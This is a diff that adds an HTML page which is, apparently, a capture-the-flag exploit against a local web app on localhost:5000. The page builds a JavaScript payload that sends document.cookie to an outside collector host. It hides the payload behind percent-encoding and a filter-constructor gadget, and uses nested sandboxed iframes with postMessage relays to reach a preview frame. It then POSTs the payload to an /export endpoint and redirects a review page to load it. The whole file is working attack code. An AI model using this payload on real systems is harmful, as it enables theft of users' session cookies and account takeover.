@@ -1,0 +1,36 @@
+<!doctype html>
+<html>
+<body>
+<script>
+window.addEventListener('DOMContentLoaded', function() {
+  const callback = "https://qmpdaak.request.dreamhack.games/collect";
+  const widgetJs = "new Image().src='" + callback + "?c='+encodeURIComponent(document.cookie)";
+  const body =
+    "(async()=>{" +
+    "const js=" + JSON.stringify(widgetJs) + ";" +
+    "const r=await fetch('/export',{method:'POST',headers:{'X-Card-Token':CARD_TOKEN,'Content-Type':'application/javascript'},body:js,credentials:'include'});" +
+    "const n=await r.text();" +
+    "parent.postMessage(n,'*')" +
+    "})()";
+
+  const enc = [...body]
+    .map(c => "%" + c.charCodeAt(0).toString(16).padStart(2, "0"))
+    .join("");
+
+  const formula = "[]['filter']['con'+'structor'](unescape('" + enc + "'))()";
+
+  onmessage = function(e) {
+    location = "http://localhost:5000/review?widget=" + encodeURIComponent(e.data);
+  };
+
+  const innerScript = "setTimeout(function(){p.contentWindow.postMessage(" + JSON.stringify(formula) + ",'*')},2000);onmessage=function(e){top.postMessage(e.data,'*')};";
+
+  document.body.innerHTML =
+    "<iframe sandbox='allow-scripts' srcdoc=\"" +
+    "<iframe id=p src='http://localhost:5000/preview'></iframe>" +
+    "<script>" + innerScript + "<\\/script>" +
+    "\"></iframe>";
+});
+</script>
+</body>
+</html>
